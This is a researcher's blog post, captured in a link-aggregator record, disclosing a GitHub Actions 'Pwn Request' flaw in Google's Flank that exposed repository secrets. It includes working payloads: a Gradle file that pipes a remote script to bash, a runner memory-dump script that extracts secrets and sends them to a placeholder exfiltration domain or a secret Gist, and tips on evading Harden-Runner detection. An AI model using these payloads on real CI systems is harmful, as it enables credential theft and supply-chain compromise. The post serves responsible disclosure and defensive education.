{"aid": "40055116", "title": "An Obscure Actions Workflow Vulnerability in Google's Flank", "url": "https://adnanthekhan.com/2024/04/15/an-obscure-actions-workflow-vulnerability-in-googles-flank/", "domain": "adnanthekhan.com", "votes": 2, "user": "varunsharma07", "posted_at": "2024-04-16 17:57:19", "comments": 0, "source_title": "An Obscure Actions Workflow Vulnerability in Google\u2019s Flank", "source_text": "An Obscure Actions Workflow Vulnerability in Google\u2019s Flank \u2013 Adnan Khan's\nBlog\n\nSkip to content\n\n  * LinkedIn\n  * X\n  * GitHub\n  * Mail\n\n# Adnan Khan's Blog\n\nbug-bounty, cicd, github, security, supplychain\n\n## An Obscure Actions Workflow Vulnerability in Google\u2019s Flank\n\nPublished by\n\nadnanthekhan\n\non\n\nApril 15, 2024\n\n  1. Introduction\n  2. Discovery & PoC\n\n    1. Gato-X\n    2. Peculiar Checkout\n\n      1. Gato-X \u2013 Coming soon to all!\n    3. Proof of Concept\n    4. Detection by Harden-Runner\n\n      1. Commit in Network of Forks\n      2. Exfiltrate to Secret Gist\n      3. Did it work?\n  3. Disclosure Timeline\n  4. References\n\n## Introduction\n\nRecently, I reported a \u201cPwn Request\u201d vulnerability in Google\u2019s Flank\nrepository. Flank is described as a \u201cMassively parallel Android and iOS test\nrunner for Firebase Test Lab\u201d and is an official Google open source project.\n\nThe vulnerability allowed anyone with a GitHub Account to steal Google service\naccount credentials which were used as a repository secret along with\nobtaining access to a GITHUB_TOKEN with write access.\n\nGoogle\u2019s VRP rewarded me with a $7,500 bug bounty for this report as a\nSoftware Supply Chain compromise under the \u201cStandard OSS Project\u201d tier.\n\nActions Injections and Pwn Request vulnerabilities are far from new, and\nexploiting them isn\u2019t worthy of blog post at this point, but there are some\nunique aspects to this particular vulnerability that I think there is value in\nhighlighting.\n\nWhat is unique about this repository is how long it was vulnerable despite\nGoogle operating one of the best bug bounty programs in the industry. Most\n\u201ctextbook\u201d Pwn Requests will be reported within days by bug bounty hunters;\nhowever, the vulnerability was introduced on Dec 17th, 2020 in this pull\nrequest. This means that for over three years no one identified this\nvulnerability despite a very high chance at a generous bug bounty payment!\n\nHow did I find it? I used an automated tool that I have been developing to\ndiscover this vulnerability. In this post I\u2019ll cover how I discovered it, my\nPoC, the disclosure timeline, and provide some words of wisdom about how I\nthink this bug class can be solved at scale.\n\n## Discovery & PoC\n\n### Gato-X\n\nWhile with my previous employer, Praetorian, I led the development of a tool\ncalled Gato. The tool focused on self-hosted runners along with post-\ncompromise enumeration and exploitation for GitHub classic personal access\ntokens. At the same time, I\u2019ve been doing bug bounty hunting on the side with\nregular expressions to discover injection and pwn requests vulnerabilities. I\nalways had the feeling that I was missing obscure cases, and I was right.\n\nI started working on adding detection for injection and Pwn requests attacks\nand adding it to my private fork of the tool. There are already tools for this\nvulnerability class like Cycode Labs\u2019 Raven and TinderSec\u2019s gh-workflow-\nauditor, however I have taken a different design approach by approaching the\nproblem from an offensive perspective.\n\nInstead of trying to audit workflows or generate actionable findings, my goal\nwas to scan workflows that run on risky triggers at scale, and then work\nbackwards from that to identify true positives:\n\n  * Take 20 or 30 thousand repositories at a time and identify candidates for further review. I used sourcegraph.com/search for this.\n  * False positives are ok, but provide context to quickly determine if something is interesting or not within a few seconds.\n  * Avoid false negatives as much as possible.\n\nCurrently, the tool will take 20-30 thousand repositories and report roughly\n2000 candidates. In the tool\u2019s current state, roughly 70 percent are false\npositives. However, for the majority of false positives I can tell just by\nlooking at the result. The best part? Gato-X performs this scan in only a few\nhours running on a laptop with a single GitHub Account.\n\nBelow is the output Gato-X presented for Flank. Right off the bat, I can tell\nthat:\n\n  * The workflow ran on issue_comment (which includes comments on pull requests)\n  * It referenced a pull request number by context expression within a run step that is called \u201cCheckout Pull Request\u201d\n\nJust by seeing this output I knew it was worth investigating. Gato-X also\nprovided a direct link to the HTML workflow, so I could click on it and\ninvestigate further.\n\n1234567891011121314151617181920212223242526272829303132333435363738|\n\"pwn_request_risk\": [],\"injection_risk\": [{\"workflow_name\":\n\"run_integration_tests.yml\",\"workflow_url\":\n\"https://github.com/Flank/flank/blob/master/.github/workflows/run_integration_tests.yml\",\"details\":\n{\"triggers\": [\"issue_comment\"],\"should_run_it\": {\"Check if integrations tests\nshould run\": {\"variables\":\n[\"env.run_it\",\"steps.check_issue_comment.outputs.triggered == 'true'\"]}},\"run-\nit-full-suite\": {\"Checkout Pull Request\": {\"variables\":\n[\"needs.should_run_it.outputs.pr_number\"],\"if_checks\": \"github.event_name ==\n'issue_comment'\"},\"if_check\":\n\"needs.should_run_it.outputs.run_integration_tests == 'true'\"},\"process-\nresults\": {\"Process IT results\": {\"variables\": [\"needs.run-it-full-\nsuite.outputs.job_status\"]},\"if_check\": \"always() && github.event_name !=\n'issue_comment'\"}}}]},  \n---|---  \n  \nYou may notice that when Gato-X picked up the repository, it did not detect\nthis as a Pwn Request, as the pwn_request_risk field is empty. This was\nbecause at the time, Gato-X did not have a specific detection for checking out\nthe PR via the gh cli, but the context surrounding the use of the pr_number\nwas enough to determine this repository was worth investigating.\n\n### Peculiar Checkout\n\nWhat made this vulnerability unique is probably also why no one found it\nbefore. The workflow ran on issue_comment, but did not actually reference\ncontext variables typically called out in resources on Actions injection\nvulnerabilities.\n\nFirst, the workflow retrieves the pull request\u2019s HTML URL. Next, it parsed out\nthe PR number from the HTML URL. Finally, it set that as the output value for\nthe step.\n\n1234567| \\- name: Get PR numberid: pr_numberif: ${{ github.event_name ==\n'issue_comment'}}run: |PR_URL=\"${{ github.event.issue.pull_request.url\n}}\"PR_NUMBER=${PR_URL##*/}echo \"number=$PR_NUMBER\" >> $GITHUB_OUTPUT  \n---|---  \n  \nThe subsequent step used the PR number from the previous step\u2019s output and\npassed it via context expression to a run step including gh pr checkout.\n\n123456| \\- name: Checkout Pull Requestif: github.event_name ==\n'issue_comment'env:GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}run: |gh pr\ncheckout ${{ needs.should_run_it.outputs.pr_number }}  \n---|---  \n  \nThis highlights the importance of source-to-sink analysis when reviewing\nGitHub Actions workflows for vulnerabilities.\n\nAfter the checkout, the workflow eventually ran integration tests which I was\nable to modify to prove that I could execute arbitrary code within the context\nof a privileged workflow.\n\n#### Gato-X \u2013 Coming soon to all!\n\nI hope to open source an alpha version of Gato-X soon. My current goal is to\ncut down the false positive rates by building an expression tree from each if\ncheck and evaluating it in the context of an external actor triggering the\nevent.\n\nI can\u2019t wait to release it, because the combination of the tool\u2019s speed and\nfinding obscure cases makes it possible for security professionals to identify\nthese issues hours at a scale that was not possible before.\n\n### Proof of Concept\n\nIn order to prove this vulnerability, on February 27th, at 10:45 EST, I\ncreated a draft pull request with my payload and was able to prove the\nvulnerability and access to the application token secret.\n\nI want to give a shout out to Boost Security\u2019s Living off the Pipeline\nProject. I was able to use an off-the-shelf payload for Gradle as my code\ninjection point. Projects like LoTP make it easier for security researchers to\nprove vulnerabilities but also give developers a list of files they should be\ncareful to make sure external actors cannot modify if workflows are running on\nrisky triggers.\n\nYou can see below how the workflow had access to a secret and then kicked off\nintegration tests using the grade/grade-build-action.\n\nI modified the settings.gradle.kts file within my fork to pull down code from\na file and pipe it to bash.\n\n1234567891011121314| // For VRP Test, not malicious.fun String.runCommand(): String? = try {ProcessBuilder(\"/bin/sh\", \"-c\", this).redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start().inputStream.bufferedReader().readText()} catch (e: Exception) {e.printStackTrace()null}val output = \"curl -sSfL https://github.com/Flank/flank/raw/88e5a56dd3ed78f4f192eadf31634c013dbbf060/README | bash\".runCommand()println(\"Shell command output: $output\")  \n---|---  \n  \nThis payload allowed me to obtain access to a GITHUB_TOKEN with write access\nand the application secret. Once I prepared the payload, I created a draft\npull request and commented @flank-it . This triggered execution of the\nworkflow in the context of the main branch.\n\nShortly after, I received the secrets in the form of a Gist.\n\n### Detection by Harden-Runner\n\nIf you looked at my payload, you probably noticed that I was downloading a raw\nfile from the base repository called README. Normally, I would just host the\nfollowing payload in a Gist and pipe it to Bash, like so:\n\n1234567891011| # Replace with Burp collaborator domain or similar.YOUR_EXFIL=\"your-exfil-domain.com\"# Uses memory dump technique from github.com/nikitastupin/pwnhub / with regex to parse out all secret values (including GITHUB_TOKEN)if [[ \"$OSTYPE\" == \"linux-gnu\" ]]; thenB64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\\\{\"value\":\"[^\"]*\",\"isSecret\":true\\\\}' | sort -u | base64 -w 0 | base64 -w 0`# Exfil to Burpcurl -s -d \"$B64_BLOB\" https://$YOUR_EXFIL/token > /dev/nullelseexit 0fi  \n---|---  \n  \nFor Flank, I employed some creativity here because I noticed that the workflow\nwas using StepSecurity\u2019s Harden-Runner in audit mode. Since harden runner was\nin audit more, I didn\u2019t have to be sneaky to prove the vulnerability, but I\nwanted to see if I could get around the detection as an exercise.\n\n#### Commit in Network of Forks\n\nI committed two files to my fork. The first was a Bash script, and the other\nwas a copy of Nikita Stupin\u2019s excellent memory dumping script which I\u2019ve used\nextensively over the past few months.\n\nIn GitHub, any commit in a fork is also within the base repository. This means\nyou can access the same commit hash from the fork repository or the base. This\nis why my payload referenced a file from the base repository.\n\n    \n    \n    val output = \"curl -sSfL https://github.com/Flank/flank/raw/88e5a56dd3ed78f4f192eadf31634c013dbbf060/README | bash\".runCommand() println(\"Shell command output: $output\")\n\n#### Exfiltrate to Secret Gist\n\nSince Harden Runner picks up requests to anomalous URLs, instead of simply\nexfiltrating the encoded blob to Burp, I used the GitHub API along with a\nfine-grained PAT (which I quickly revoked after the PoC) to upload the GCloud\napplication token and GITHUB_TOKEN to a secret Gist.\n\n12345678910111213141516| if [[ \"$OSTYPE\" == \"linux-gnu\" ]]; thenB64_BLOB=`curl -sSfL https://github.com/flank/flank/raw/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\\\{\"value\":\"[^\"]*\",\"isSecret\":true\\\\}' | sort -u | base64 -w 0`YEETER_TOKEN=\"<EXFIL TOKEN>\"YEETER_TOKEN_DECODED=`echo $YEETER_TOKEN | base64 -d | base64 -d`curl -L \\-X POST \\-H \"Accept: application/vnd.github+json\" \\-H \"Authorization: Bearer $YEETER_TOKEN_DECODED\" \\-H \"X-GitHub-Api-Version: 2022-11-28\" \\https://api.github.com/gists -d '{\"public\":false,\"files\":{\"Spoils\":{\"content\":\"'$B64_BLOB'\"}}}'sleep 900elseexit 0fi  \n---|---  \n  \nThis exfiltration method is very useful for exploiting actions vulnerabilities\nbecause all traffic goes to GitHub. It\u2019s even more useful on self-hosted\nrunners where the runner is in an environment that might have strong egress\ncontrols.\n\n#### Did it work?\n\nHarden-Runner actually did detect one anomalous request during my PoC, which\nwas impressive. I had thought that using a commit from the base repository\nwould have masked the behavior, but the issue was that the call to\nraw.githubusercontent itself was anomalous within that workflow as seen on the\ninsights page. Had harden-runner been in block mode, it would have blocked the\ninitial download of the payload and I would have had to scramble to update it\nto use a different method or just hardcode the full payload in the pull\nrequest.\n\nThis is important! In a real-world supply chain attack scenario, alerting on\nthe attacker\u2019s first exploit attempt can place security teams on notice, so\neven if the attacker re-exploited and successfully captured the application\ntoken, a security team can contain the attacker by revoking secrets and\ntemporarily disabling Actions while they assess the breach. Supply chain\nattacks are unique in that they are usually delayed fuse attacks, if a\nsecurity team can catch an attacker in the act, then it is unlikely the\nattacker would be able to cause any long-term damage.\n\nIn hindsight, I should have used GitHub\u2019s API to download the commit using the\nAPI, parsed the content Base64 blob from the JSON response, and then piped\nthat into Bash, this would have avoided the anomalous event. I could have gone\neven further to use Java to do it, because then both the destination and the\nURL would match the baseline.\n\nNo defensive product can prevent every single exfiltration or attack vector,\nbut I was definitely impressed with Harden Runner as a security solution for\nGitHub Actions workflows.\n\nRight now, if an attacker gets inside a workflow execution via a Pwn Request\nor supply chain attack on an upstream dependency, or even Actions cache\npoisoning (stay tuned \u2013 I\u2019ve got a lot more on that coming soon), then there\nisn\u2019t anything there to detect or stop them.\n\n## Disclosure Timeline\n\n  * February 27th, 2024 \u2013 Report sent to Google VRP\n  * February 28th, 2024 \u2013 Report Accepted\n  * March 5th, 2024 \u2013 Awarded $7,500 Bounty\n  * March 11th, 2024 \u2013 Workflow fixed by Google in https://github.com/Flank/flank/pull/2482\n  * April 3rd, 2024 \u2013 Informed Google of plans to publish blog post mid-April and shared draft. Received word that I am good to publish.\n  * April 15th, 2024 \u2013 Blog published.\n\nAs always, I had a very good experience reporting this bug to Google\u2019s VRP.\n\n## References\n\n  * https://boostsecurityio.github.io/lotp/ \u2013 Boost Security\u2019s Living off the Pipeline Project\n  * https://github.com/step-security/harden-runner \u2013 StepSecurity Harden Runner\n  * https://github.com/nikitastupin/pwnhub \u2013 Nikita Stupin\u2019s Pwnhub Repository\n\n### Share this:\n\n  * Twitter\n  * Facebook\n\nLike Loading...\n\n### Leave a comment Cancel reply\n\nPrevious Post Web3\u2019s Achilles\u2019 Heel: A Supply Chain Attack on Astar Network\n\n# Adnan Khan's Blog\n\nRed Teaming, CI/CD Security, and more\n\n  * LinkedIn\n  * X\n  * GitHub\n  * Mail\n\nBlog at WordPress.com.\n\nLoading Comments...\n\n  * Comment\n  * Reblog\n  * Subscribe Subscribed\n\n    * Adnan Khan's Blog\n    * Already have a WordPress.com account? Log in now.\n\n  * Privacy\n  *     * Adnan Khan's Blog\n    * Edit Site\n    * Subscribe Subscribed\n    * Sign up\n    * Log in\n    * Copy shortlink\n    * Report this content\n    * View post in Reader\n    * Manage subscriptions\n    * Collapse this bar\n\n%d\n\n", "frontpage": false}
